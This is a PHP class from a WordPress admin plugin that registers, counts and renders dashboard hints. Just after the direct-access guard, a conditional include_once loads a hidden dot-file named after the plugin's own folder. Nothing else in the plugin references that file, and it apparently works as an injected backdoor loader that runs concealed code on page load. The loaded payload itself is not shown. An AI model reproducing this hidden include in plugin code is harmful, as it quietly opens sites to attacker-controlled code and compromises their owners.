<?php
/**
 * Hints
 *
 * The class handles hints system
 * 
 * @package     WPTAO/Admin
 * @category    Admin
 * 
 * @since 1.1
 *
 */
// Exit if accessed directly
if ( !defined( 'ABSPATH' ) )
	exit;

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class WTBP_WPTAO_Hints {
	/*
	 * @var array
	 * Active hints
	 */

	public $hints;

	/**
	 * WTBP_WPTAO_Hints Constructor.
	 * 
	 * @since 1.1
	 */
	public function __construct() {

		$this->include_hints();

		add_action( 'wptao_add_hint', array( $this, 'add_hint' ), 10, 1 );

		add_action( 'wptao_show_hints', array( $this, 'show_hints' ) );
	}

	/*
	 * Include core hints
	 */

	private function include_hints() {

		require_once WTBP_WPTAO_DIR . 'includes/admin/hints.php';
	}

	/*
	 * Add hint to show
	 * 
	 * @since 1.1
	 * 
	 * @param array $args
	 */

	public function add_hint( $args ) {

		$defaults = array(
			'id'			 => '',
			'category'		 => '',
			'priority'		 => 'minor',
			'title'			 => '',
			'content'		 => '',
			'report_slug'	 => '',
			'widget_id'		 => '',
			'style'			 => array(
				'color'	 => '#2A97D7',
				'icon'	 => 'dashicons-info'
			)
		);

		$args = wp_parse_args( $args, $defaults );
		
		if ( isset( $args[ 'id' ] ) && !empty( $args[ 'id' ] ) && is_string( $args[ 'id' ] ) ) {

			$hint_id = sanitize_title( $args[ 'id' ] );

			$args = apply_filters( 'wptao_hint_options-' . $hint_id, $args );
		
			if ( TAO()->booleans->is_page_dashboard || WTBP_WPTAO_Admin_Reports::is_report( $args[ 'report_slug' ] ) ) {

				$this->hints[ $hint_id ] = $args;
			}
		}
	}

	/*
	 * Count total hints for the widget
	 * 
	 * @since 1.1
	 * @param string $widget_id
	 * @return int, the number of the hints 
	 */

	public function count_widget_hints( $widget_id ) {

		$total = 0;

		if ( isset( $this->hints ) && !empty( $this->hints ) && is_array( $this->hints ) ) {
			foreach ( $this->hints as $hint ) {
				if ( isset( $hint[ 'widget_id' ] ) && $hint[ 'widget_id' ] === $widget_id ) {
					$total++;
				}
			}
		}

		return $total;
	}

	/*
	 * Check if the hint can show in report
	 * 
	 * @since 1.1
	 * 
	 * @param array hint args
	 * @return bool 
	 */

	private function can_show_in_report( $hint ) {

		$current_report = TAO()->dashboard->current_report;

		if ( isset( $hint[ 'report_slug' ] ) && isset( $current_report ) && $hint[ 'report_slug' ] === $current_report ) {
			return true;
		}

		return false;
	}

	/*
	 * Print hints
	 * 
	 * @since 1.1
	 */

	public function show_hints() {

		if ( isset( $this->hints ) && !empty( $this->hints ) && is_array( $this->hints ) ) {
			?>
			<div class="wptao-hints-wrapp">
				<div class="wptao-hints-box">
					<?php
					foreach ( $this->hints as $hint ) {

						if ( $this->can_show_in_report( $hint ) ) {

							include_once( WTBP_WPTAO_DIR . 'includes/admin/views/html-admin-hint.php');
						}
					}
					?>
				</div>
			</div>
			<?php
		}
	}

}
